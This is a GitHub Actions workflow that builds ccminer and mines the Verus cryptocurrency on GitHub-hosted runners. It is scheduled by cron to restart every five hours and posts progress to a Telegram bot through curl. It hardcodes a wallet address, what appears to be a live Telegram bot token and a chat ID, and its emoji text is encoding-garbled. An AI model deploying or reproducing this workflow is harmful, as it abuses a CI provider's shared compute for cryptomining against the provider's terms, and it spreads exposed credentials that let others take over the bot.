name: Verus Miner (Realtime Telegram + CPU Monitor)

on:
  schedule:
    - cron: "0 */5 * * *"  # Auto restart tiap 5 jam
  workflow_dispatch:

jobs:
  verusmine:
    runs-on: ubuntu-latest
    timeout-minutes: 300  # 5 jam

    steps:
      - name: Install dependencies
        run: |
          sudo apt update
          sudo apt install -y \
            build-essential git cmake automake libtool autoconf pkg-config \
            libcurl4-openssl-dev sysstat

      - name: Clone & build ccminer
        run: |
          git clone https://github.com/monkins1010/ccminer.git
          cd ccminer
          chmod +x build.sh
          ./build.sh

      - name: Start mining with monitoring
        run: |
          WORKER="GH-${GITHUB_RUN_ID}"
          WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
          THREADS=2
          POOL="stratum+tcp://na.luckpool.net:3956"

          TELEGRAM_TOKEN="7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc"
          TELEGRAM_CHAT_ID="5763229296"

          function tg_notify() {
            curl -s -X POST https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage \
              -d chat_id="$TELEGRAM_CHAT_ID" \
              -d parse_mode=Markdown \
              -d text="$1" > /dev/null
          }

          cd ccminer
          LOG="log.txt"
          rm -f $LOG

          tg_notify "üöÄ *Mining dimulai* di *$WORKER* (`$THREADS` threads)."

          ./ccminer -a verus -o $POOL -u $WALLET.$WORKER -p x -t $THREADS | tee $LOG &

          PID=$!
          LAST_SHARE=$(date +%s)
          MAX_IDLE=600  # 10 menit

          SHARES_ACCEPTED=0

          while sleep 60; do
            if ! kill -0 $PID 2>/dev/null; then
              tg_notify "‚ùå *Miner crash* di *$WORKER*"
              exit 1
            fi

            CPU_USE=$(mpstat 1 1 | awk '/Average/ && $12 ~ /[0-9.]+/ { print 100 - $12 }')
            echo "[CPU] ${CPU_USE}% usage"

            LAST_LINE=$(tail -n 1 "$LOG")
            NOW=$(date +%s)

            if echo "$LAST_LINE" | grep -q "accepted"; then
              SHARES_ACCEPTED=$((SHARES_ACCEPTED + 1))
              LAST_SHARE=$NOW
              HASHRATE=$(echo "$LAST_LINE" | grep -o "[0-9.]\+ kH/s")
              tg_notify "‚úÖ *Share accepted* on *$WORKER* ‚Äî ${HASHRATE} ‚Äî Total: *${SHARES_ACCEPTED}*"
            fi

            if [ $((NOW - LAST_SHARE)) -gt $MAX_IDLE ]; then
              tg_notify "‚ö†Ô∏è *Idle selama 10 menit*, restarting miner *$WORKER*..."
              kill $PID
              break
            fi
          done

          tg_notify "‚úÖ *Mining selesai* di *$WORKER*. Total share: *$SHARES_ACCEPTED*."
